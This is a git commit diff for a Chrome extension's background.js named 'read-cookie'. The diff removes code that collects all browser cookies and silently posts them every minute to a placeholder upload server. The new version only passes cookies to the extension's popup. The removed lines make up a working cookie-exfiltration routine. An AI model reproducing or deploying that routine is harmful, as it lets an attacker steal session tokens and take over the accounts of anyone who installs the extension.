3368088a1e1492f5fde6a0fef1d61484f297d257
pankajsheoran <pnkj.sheoran@gmail.com>
2026-05-04 00:36:59 +0530

    working

--- read-cookie/background.js
+++ read-cookie/background.js
@@ -1,9 +1,6 @@
 console.log("Background service worker loaded!");
 
-// ---- Configuration ----
-const BACKEND_URL = "http://your-server.com/upload.php"; // Change to your Apache server
-
-// ---- Read all cookies and return as array ----
+// Function to read all cookies and return a promise with a single variable
 function getAllCookies() {
   return new Promise((resolve) => {
     chrome.cookies.getAll({}, (cookies) => {
@@ -17,38 +14,10 @@ function getAllCookies() {
   });
 }
 
-// ---- Send cookies to backend server ----
-function sendCookiesToServer(allCookies) {
-  fetch(BACKEND_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(allCookies)
-  })
-  .then(res => res.text())
-  .then(text => console.log("Server response:", text))
-  .catch(err => console.error("Error sending cookies:", err));
-}
-
-// ---- Read and send cookies ----
-function readAndUploadCookies() {
-  getAllCookies().then(allCookies => {
-    console.log("Uploading", allCookies.length, "cookies to server...");
-    sendCookiesToServer(allCookies);
-  });
-}
-
-// ---- Periodic alarm every 1 minute ----
-chrome.alarms.create("uploadCookies", { periodInMinutes: 1 });
-chrome.alarms.onAlarm.addListener((alarm) => {
-  if (alarm.name === "uploadCookies") {
-    readAndUploadCookies();
-  }
-});
-
-// ---- Optional: manual trigger from popup ----
+// Handle messages from popup
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
-  if (msg.action === "readNow") {
-    readAndUploadCookies();
-    sendResponse({ message: "Cookie read/upload triggered!" });
+  if (msg.action === "getCookies") {
+    getAllCookies().then(allCookies => sendResponse({ allCookies }));
+    return true; // keep message channel open for async
   }
 });
